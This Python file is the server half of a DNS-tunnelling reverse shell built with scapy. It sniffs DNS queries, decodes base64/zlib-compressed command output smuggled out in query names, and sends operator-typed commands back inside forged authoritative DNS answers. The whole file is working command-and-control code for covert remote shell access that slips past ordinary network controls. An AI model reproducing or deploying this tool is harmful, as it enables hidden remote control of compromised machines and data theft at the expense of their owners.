#!/usr/bin/env python3
from scapy.all import IP, UDP, DNS, DNSRR, send, sniff
from base64 import b64encode, b64decode
from urllib import request

import threading
import argparse
import zlib

parser = argparse.ArgumentParser(description="DNS Reverse Shell Server")
parser.add_argument('domain', metavar='domain', type=str, help='Domain to connect to')
parser.add_argument('-i',
                    '--interface',
                    action='store',
                    type=str,
                    help='Interface to use',
                    default='eth0')
parser.add_argument('-p',
                    '--ip',
                    action='store',
                    type=str,
                    help='Public IP of server',
                    default=request.urlopen('https://ipinfo.io/ip').read().decode())

args = parser.parse_args()

PUBLIC_IP = args.ip
IFACE = args.interface
DOMAIN = args.domain

FRAG_LEN = 70 - len(DOMAIN)

recv = b""  # Buffer of received data to process
queue = []  # List of commands to run
buf = []  # Break commands to send into smaller fragmented pieces


def reply(pkt, data=False) -> None:
    global buf
    # Construct the IP header
    ip = IP(src=pkt[IP].dst, dst=pkt[IP].src)
    # Consturct the UDP header
    udp = UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)

    # Check if data is pulse or not
    if data is False:
        data = pkt[DNS].qd.qname

    # Mark as last packet
    z = 0
    if buf == []:
        z = 1

    # Construct the DNS header
    dns = DNS(id=pkt[DNS].id,
              qd=pkt[DNS].qd,
              aa=1,
              qr=1,
              z=z,
              an=DNSRR(rrname=data, type='A', ttl=600, rdata=PUBLIC_IP))

    # Send the data
    send(ip / udp / dns, iface=IFACE, verbose=False)


# Encodes into base64 and fragments data into smaller pieces
def encode(data: bytes) -> list:
    data = data.strip()
    data = zlib.compress(data)
    e_data = b64encode(data).decode()
    frag_e_data = [e_data[i:i + FRAG_LEN] for i in range(0, len(e_data), FRAG_LEN)]
    return frag_e_data


# Decode base64
def decode(data: bytes) -> str:
    data = b64decode(data)
    data = zlib.decompress(data)
    return data.decode()


# Handle packets that come in
def pkt_callback(pkt) -> None:
    global queue
    global recv
    global buf

    # Extract data from client
    data = pkt.qd.qname.split(f".{DOMAIN}".encode())[0]

    # Check if is pulse or reply
    if data != b"pulse":
        recv += data

        # Check if last packet
        if pkt[DNS].z == 1:
            try:
                print(decode(recv))
            except:
                # UDP may lose data, oh wells...
                print("Data got corrupted!")
            recv = b""

        reply(pkt)
    else:
        # Fragment the commands to be sent if it's too long
        if buf == [] and queue != []:
            buf = encode(queue.pop(0))

        if buf != []:  # Check if there are any more commands left to send
            reply(pkt, buf.pop(0) + f".{DOMAIN}")
        else:  # Continue with pulse
            reply(pkt)


# Handle user input
def user_input():
    while True:
        queue.append(input().encode())


def main():
    print("Server started!")
    threading.Thread(target=user_input).start()

    # Sniff dns packets
    sniff(iface=IFACE, prn=pkt_callback, filter="udp dst port 53 and udp[10] & 0x80 = 0", store=0)


if __name__ == "__main__":
    main()
